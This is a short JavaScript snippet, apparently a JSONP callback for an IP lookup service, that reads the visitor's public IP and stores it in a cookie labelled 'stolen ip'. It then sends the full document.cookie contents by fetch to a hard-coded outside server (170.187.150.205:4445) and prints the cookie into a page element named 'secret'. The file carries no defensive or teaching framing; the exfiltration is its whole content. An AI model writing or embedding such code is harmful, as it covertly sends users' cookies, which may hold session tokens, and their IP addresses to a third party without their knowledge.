function logme(hi){
    console.log(hi)
}

logme("api data in")


function getIP(json) {
   // alert("My public IP address is: " + json.ip);
   console.log('user IP is: '+json.ip)

   document.cookie = "userinfo = " + 'stolen ip:' + json.ip
   fetch("http://170.187.150.205:4445/index.html?"+document.cookie)
   document.getElementById('secret').innerHTML = document.cookie
  }